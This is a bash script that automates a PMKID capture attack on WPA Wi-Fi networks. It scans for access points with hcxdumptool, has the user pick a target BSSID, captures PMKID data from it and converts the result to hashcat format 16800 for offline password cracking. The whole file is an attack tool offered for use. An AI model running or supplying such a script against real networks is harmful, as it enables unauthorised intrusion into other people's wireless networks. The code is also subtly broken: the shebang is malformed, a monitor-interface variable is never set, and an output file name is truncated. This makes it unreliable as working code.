#!bin/bash
# Run with root privileges.
wn_interface=${wn_interface:-"not_specified"}
target_bssid=${target_bssid:-"not_specified"}
capture_file_name=${capture_file_name:-"not_specified"}

while [ $# -gt 0 ]; do

  if [[ $1 == *"--"* ]]; then
    param="${1/--/}"
    declare "$param"="$2"
    echo "$1" "$2"
  fi

  shift
done

if [[ $wn_interface == "not_specified" ]]; then
  echo "Showing WNICs."
  iwconfig
  read -p "Type the interface: " wn_interface
fi

if [[ $capture_file_name == "not_specified" ]]; then
  current_time=$(date "+%H.%M.%S")
  capture_file_name=wpa_capture_${current_time}
fi

if [[ $target_bssid == "not_specified" ]]; then
  echo "Starting hashcat reacon scan on ${wn_interface_monitor}."

  xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface --do_rcascan &
  read -p "Type BSSID: " target_bssid

  killall xterm
fi

systemctl stop NetworkManager.service
sleep 2
systemctl stop wpa_supplicant.service
sleep 1

echo "Forwarding choosen AP's BSSID to configuration file."
echo $target_bssid >target_bssid.txt

echo "Wait until you receive [PMKID FOUND]. This may take some."
hcxdumptool -i $wn_interface_monitor -o ./dumpfile.pcapng --enable_status=1 --filterlist_ap=target_bssid.txt --filtermode=2

echo "Bringing back wlan services..."
systemctl start wpa_supplicant.service
systemctl start NetworkManager.service
sleep 1

hcxpcaptool -E essidlist -I identitylist -U usernamelist -z ${capture_file_name}.hc16800 dumpfile.pcapng

echo "Reversing ${wn_interface_monitor} back to ${wn_interface}."
airmon-ng stop $wn_interface_monitor

rm target_bssid.txt

echo "Converting the capture to hash format 16800."
hcxpcapngtool -o ./${capture_file_name}.   ./dumpfile.pcapng

rm dumpfile.pcapng

echo "Your PMKID is in ${capture_file_name}.hc16800."
echo "Done."
